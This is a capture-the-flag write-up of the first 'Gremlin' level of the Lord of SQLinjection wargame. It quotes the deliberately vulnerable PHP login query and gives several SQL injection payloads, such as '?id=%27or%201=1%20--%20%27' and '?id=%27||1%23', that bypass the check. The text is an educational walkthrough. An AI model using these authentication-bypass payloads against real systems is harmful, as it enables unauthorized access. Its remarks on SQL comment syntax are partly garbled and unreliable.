# **1.Gremlin**

Let's get to this challenge by search `Lord of SQLinjection`.

If you can't find it, try the url below:
[los.eagle-jump](https://los.eagle-jump.org/)

It seems the child CTF web site of **Stereotyped Challenges**, but more eazier(?), perhaps that......

First, this is start page, sign up and login.

After you login, you'll redirect to this page.

Press the first monster, Gremlin.

Then you'll find source code below.

```
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?> 
```

Make `$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";` be `True` from return error, then you'll pass it.

For this kind of SQL question, that's use the basic startup the try it, `' or 1=1 --`.

However, it failed.

This is the Basic question, we just like living in the world of "[Goblin Slayer](https://en.wikipedia.org/wiki/Goblin_Slayer)".

The weaker, the trickier.

The bug always to be comma missing, LOL.

Here is the thing, I found that command symbols between SQL and MySQL are a little bit different from each others.

In [SQL](https://docs.microsoft.com/zh-tw/sql/t-sql/language-elements/comment-transact-sql), it use `--%20`, two minus with one space.

But in [MySQL](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html), it just use two minus, `--`.

And there's one more thing should be noticed, the space without quot, `'`, it will be ignored while during transaction.

So, to this question, the payload should be 
```
?id=%27or%201=1%20--%20%27
```
```
?id='or 1=1 -- '
```
```
?id=%27||1%23
```
```
?id=`||1#
```

Append it to the url, then you pass it.
